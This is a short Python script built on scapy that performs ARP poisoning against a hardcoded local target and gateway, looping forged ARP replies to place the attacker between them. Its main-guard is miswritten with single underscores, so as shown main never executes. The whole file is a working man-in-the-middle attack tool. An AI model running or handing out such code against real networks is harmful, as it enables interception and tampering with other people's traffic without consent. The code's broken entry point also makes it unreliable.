from scapy.all import *

# Function to perform ARP poisoning
def arp_poison(target_ip, target_mac, gateway_ip, gateway_mac):
    # Creating ARP packets
    target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)

    # Sending ARP packets
    while True:
        send(target_packet)
        send(gateway_packet)
        time.sleep(1)

# Get the MAC address of a given IP address
def get_mac(ip):
    result, unanswered = arping(ip)
    for sent, received in result:
        return received.hwsrc

# Main function
def main():
    target_ip = "192.168.0.100"  # Target IP address
    gateway_ip = "192.168.0.1"  # Gateway IP address

    target_mac = get_mac(target_ip)  # Get target MAC address
    gateway_mac = get_mac(gateway_ip)  # Get gateway MAC address

    if target_mac is None or gateway_mac is None:
        print("Failed to get target or gateway MAC address. Exiting...")
        return

    print("ARP poisoning started...")
    arp_poison(target_ip, target_mac, gateway_ip, gateway_mac)

# Execute the main function
if _name_ == "_main_":
    main()